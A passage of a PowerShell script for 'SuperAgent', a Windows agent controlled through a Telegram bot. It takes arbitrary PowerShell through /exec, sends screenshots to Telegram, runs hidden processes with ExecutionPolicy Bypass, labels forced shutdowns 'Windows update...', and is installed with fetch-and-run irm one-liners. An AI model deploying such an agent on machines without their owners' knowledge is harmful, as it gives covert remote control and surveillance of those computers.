            Move-Item $tempFile $ScriptPath -Force
            Send-Telegram "[$PCName] Update complete, restarting agent..."

            $restartCmd = "Start-Sleep -Seconds 3; try { Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue } catch {}; Start-Sleep -Seconds 2; try { Start-ScheduledTask -TaskName '$TaskName' } catch {}"
            Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$restartCmd`"" -WindowStyle Hidden | Out-Null

            Write-Log "Update done. Agent exiting to allow restart."
            exit 0
        } catch {
            Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
            if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
        }
    }

    # --- Pending uninstall confirmation tracking ---
    $script:UninstallPendingAt = $null

    function Test-UninstallConfirmation {
        if ($script:UninstallPendingAt) {
            $elapsed = (Get-Date) - $script:UninstallPendingAt
            if ($elapsed.TotalSeconds -le 10) { return $true }
        }
        return $false
    }
    function Set-UninstallPending   { $script:UninstallPendingAt = Get-Date }
    function Clear-UninstallPending { $script:UninstallPendingAt = $null }

    function Invoke-SelfUninstall {
        Write-Log "Self-uninstall triggered - spawning cleanup process"

        $uninstallCmd = @"
Start-Sleep -Seconds 3
try {
    Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName '$TaskName' -Confirm:`$false -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Seconds 1
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { `$_.CommandLine -like '*pcagent.ps1*' } |
    ForEach-Object { try { Stop-Process -Id `$_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
Start-Sleep -Seconds 1
if (Test-Path '$InstallDir') {
    Remove-Item -Recurse -Force '$InstallDir' -ErrorAction SilentlyContinue
}
"@
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$uninstallCmd`"" -WindowStyle Hidden | Out-Null
    }

    # --- Boot notification ---
    Wait-Network
    $bootMsg = Get-PCInfo
    $bootOk = Send-Telegram $bootMsg
    if (-not $bootOk) {
        Write-Log "Boot notification FAIL - check BotToken/ChatId/network"
    }

    # --- Main polling loop ---
    $pollCount = 0
    while ($true) {
        try {
            $url = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset&timeout=30"
            $response = Invoke-RestMethod -Uri $url -TimeoutSec 35
            $pollCount++
            if ($pollCount % 20 -eq 0) { Write-Log "Polling OK, $pollCount cycles, offset=$Offset" }

            if ($response.result) {
                foreach ($update in $response.result) {
                    $script:Offset = [int]$update.update_id + 1
                    try { $Offset | Out-File $OffsetPath -Encoding ASCII -ErrorAction SilentlyContinue } catch { }

                    if (-not $update.message) { continue }
                    if (-not $update.message.text) { continue }

                    $fromChatId = [string]$update.message.chat.id
                    if ($fromChatId -ne $ChatId) {
                        Write-Log "REJECT message from chat_id=$fromChatId (expected=$ChatId)"
                        continue
                    }

                    $text = $update.message.text.Trim()
                    if (-not $text.StartsWith('/')) { continue }

                    Write-Log "RECV command: $text"

                    # --- Parse: /cmd [@pcname] [args...] ---
                    $parts = $text -split '\s+'
                    $cmd   = $parts[0].ToLower()

                    $pcname   = $null
                    $restArgs = @()

                    if ($parts.Length -le 1) { }
                    elseif ($parts[1].StartsWith('@')) {
                        $pcname = $parts[1].Substring(1)
                        if ($parts.Length -gt 2) { $restArgs = $parts[2..($parts.Length - 1)] }
                    }
                    else {
                        $arg1 = $parts[1]
                        $looksLikePC = $arg1 -match '^[A-Za-z][A-Za-z0-9_\-]{0,31}$'
                        if ($looksLikePC -and $cmd -notin @('/exec', '/msg')) {
                            $pcname = $arg1
                            if ($parts.Length -gt 2) { $restArgs = $parts[2..($parts.Length - 1)] }
                        }
                        else { $restArgs = $parts[1..($parts.Length - 1)] }
                    }

                    if ($pcname -and $pcname -ne $PCName) { continue }

                    $restText = ($restArgs -join ' ').Trim()

                    switch ($cmd) {
                        '/shutdown' {
                            Send-Telegram "[$PCName] Shutting down..."
                            shutdown /s /t 3 /f /c 'Windows update...'
                        }
                        '/restart' {
                            Send-Telegram "[$PCName] Restarting..."
                            shutdown /r /t 3 /f /c 'Windows update...'
                        }
                        '/lock' {
                            $ok = Invoke-Lock
                            if ($ok) { Send-Telegram "[$PCName] Screen locked" }
                            else     { Send-Telegram "[$PCName] No active user session to lock" }
                        }
                        '/status' {
                            Send-Telegram (Get-PCInfo)
                        }
                        '/screenshot' {
                            $file = Invoke-Screenshot
                            if ($file) {
                                Send-TelegramPhoto -FilePath $file -Caption "[$PCName] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
                                Remove-Item $file -Force -ErrorAction SilentlyContinue
                            } else {
                                Send-Telegram "[$PCName] Screenshot failed (see agent.log for details)"
                            }
                        }
                        '/msg' {
                            if (-not $pcname) {
                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`nUse /msgall <text> to broadcast to ALL PCs."
                            } elseif (-not $restText) {
                                Send-Telegram "[$PCName] Usage: /msg @pc <text>"
                            } else {
                                $ok = Invoke-Msg -Text $restText
                                if ($ok) { Send-Telegram "[$PCName] Displayed: $restText" }
                                else     { Send-Telegram "[$PCName] Cannot display (no user session or error)" }
                            }
                        }
                        '/msgall' {
                            $allArgs = $parts[1..($parts.Length - 1)]
                            if ($allArgs -and $allArgs[0].StartsWith('@')) {
                                $allArgs = $allArgs[1..($allArgs.Length - 1)]
                            }
                            $msgText = ($allArgs -join ' ').Trim()
                            if ($msgText) {
                                $ok = Invoke-Msg -Text $msgText
                                if ($ok) { Send-Telegram "[$PCName] Displayed (broadcast): $msgText" }
                                else     { Send-Telegram "[$PCName] Cannot display (no user session)" }
                            } else {
                                Send-Telegram "[$PCName] Usage: /msgall <text>"
                            }
                        }
                        '/exec' {
                            if ($restText) {
                                $result = Invoke-Exec -Command $restText
                                Send-Telegram "[$PCName] > $restText`:`n$result"
                            } else {
                                Send-Telegram "[$PCName] Usage: /exec @pc <PowerShell command>"
                            }
                        }
                        '/update' {
                            Invoke-Update
                        }
                        '/uninstall' {
                            if (Test-UninstallConfirmation) {
                                Clear-UninstallPending
                                Send-Telegram "[$PCName] Uninstall CONFIRMED. Removing in 3s..."
                                Invoke-SelfUninstall
                                exit 0
                            } else {
                                Set-UninstallPending
                                Send-Telegram "[$PCName] Uninstall requested. Send /uninstall again within 10s to CONFIRM."
                                Write-Log "Uninstall pending confirmation"
                            }
                        }
                        '/log' {
                            if (Test-Path $LogPath) {
                                $lines = Get-Content $LogPath -Tail 50
                                $ltext = ($lines -join "`n")
                                if ($ltext.Length -gt 3900) { $ltext = $ltext.Substring($ltext.Length - 3900) }
                                Send-Telegram "[$PCName] Last 50 log lines:`n`n$ltext"
                            } else {
                                Send-Telegram "[$PCName] No log file yet"
                            }
                        }
                        '/help' {
                            $help = @"
[$PCName] *Available commands:*
/shutdown [pc]      - Power off machine
/restart  [pc]      - Restart machine
/lock     [pc]      - Lock screen
/status   [pc]      - PC info (IP, OS, CPU, RAM, uptime)
/screenshot [pc]    - Capture screen (full, DPI-aware)
/msg   @pc <text>   - Show popup on ONE PC (requires @)
/msgall <text>      - Show popup on ALL PCs
/exec  @pc <cmd>    - Run PowerShell command (requires @)
/update  [pc]       - Self-update from GitHub
/uninstall [pc]     - REMOVE agent (requires 2x confirmation within 10s)
/log     [pc]       - Show last 50 log lines
/help               - Show this help

[pc] = PC name (e.g. PC-Office), omit = ALL PCs.
/msg and /exec REQUIRE @pc. /msgall does not need @pc.
"@
                            Send-Telegram $help
                        }
                        default { }
                    }
                }
            }
        }
        catch {
            Write-Log "POLL ERROR: $($_.Exception.Message)"
            Start-Sleep -Seconds 5
        }
    }
}

# =====================================================================
# DISPATCH
# =====================================================================
function Pause-Exit {
    param([string]$Msg = 'Press Enter to exit...')
    Write-Host ''
    try { Read-Host $Msg | Out-Null } catch { }
}

if ($Install) {
    try {
        & $InstallBlock
        $code = $LASTEXITCODE
        if ($null -eq $code) { $code = 0 }
        if (-not $Silent) { Pause-Exit }
        exit $code
    } catch {
        Write-Msg ''
        Write-Msg '===================================================' -Color Red
        Write-Msg ' INSTALL ERROR:' -Color Red
        Write-Msg '===================================================' -Color Red
        Write-Msg $_.Exception.Message -Color Yellow
        Write-Msg ''
        Write-Msg 'Stack trace:' -Color DarkGray
        Write-Msg $_.ScriptStackTrace -Color DarkGray
        if (-not $Silent) { Pause-Exit }
        exit 1
    }
}

if ($Uninstall) {
    try {
        & $UninstallBlock
        if (-not $Silent) { Pause-Exit }
        exit 0
    } catch {
        Write-Msg ''
        Write-Msg '===================================================' -Color Red
        Write-Msg ' UNINSTALL ERROR:' -Color Red
        Write-Msg '===================================================' -Color Red
        Write-Msg $_.Exception.Message -Color Yellow
        if (-not $Silent) { Pause-Exit }
        exit 1
    }
}

if ($Run) {
    try {
        & $AgentBlock
    } catch {
        Start-Sleep -Seconds 10
        exit 1
    }
    exit 0
}

if (-not $Silent) {
    Write-Msg ''
    Write-Msg '=== SuperAgent - Usage ===' -Color Cyan
    Write-Msg ''
    Write-Msg 'Install (silent, recommended):'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
    Write-Msg ''
    Write-Msg 'Install (interactive):'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install"
    Write-Msg ''
    Write-Msg 'Uninstall (silent):'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall -Silent"
    Write-Msg ''
}
exit 0
